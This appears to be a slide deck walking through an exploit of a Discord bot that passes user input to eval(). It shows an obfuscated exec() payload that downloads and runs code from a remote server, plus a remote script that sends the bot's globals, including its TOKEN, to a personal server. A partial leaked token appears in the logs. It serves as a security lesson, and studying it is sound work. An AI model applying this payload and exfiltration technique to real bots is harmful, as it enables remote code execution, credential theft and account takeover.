title: Discord Bots
---

# How to Trigger Timmy (Discord Bots)
Robert Chen

---

# Context
Discord bots are cool.
Let's make one to report on snow days? 

---

# Problem
Bad programming ethic. 

```
snowman_count = round(eval(between))
```

Eval is evil. 
The user controls the `between` variable. 

---
# Eval?
>imports do nto work
stop trying to do that lol
-- <cite>Timothy Z.</cite>

They don't work with eval. 

---
# Exec
> Eval accepts only a single expression, exec can take a code block that has Python statements.

It's a lot more powerful

---
# Example
```
exec("""
some_code_here
""")
```

---
# Attack
We can execute any python program we want. 
1. Obfuscate url so it's not obvious what we're doing.
2. Use `requests.get` to load file from remote server.
3. Execute remote file. 

This lets us run arbitrary code with little suspicion.

---
# Obfuscation
Obfuscate
```
[ord(i) + 1 for i in "http://test.robertchen.cc/asdf.txt"]
```
Deobfuscate
```
url = "".join([chr(i -1) for i in [...]])
```

---
# Full Payload
```
give me exec("""
url = "".join([chr(i -1) for i in [...]])
code = requests.get(url).content
exec(code)
""") snowmen
```

---
# Remote Server 
1. Use `globals()` to get all global variables. 
2. Send the `TOKEN` value to remote server.
3. Create a new bot with the `TOKEN`. 
4. ...
5. Profit??

---
# asdf.txt
```
requests.get("https://personal.server" + str(globals()))
```
Then we pick through the logs manually.

---
# Logs
```
...%20'TOKEN':%20'NTQ0NzA1MTg4NDY5MTQ1NjM...
```
Note that it's url encoded.
`%20` = `' '`

---
# Profit?
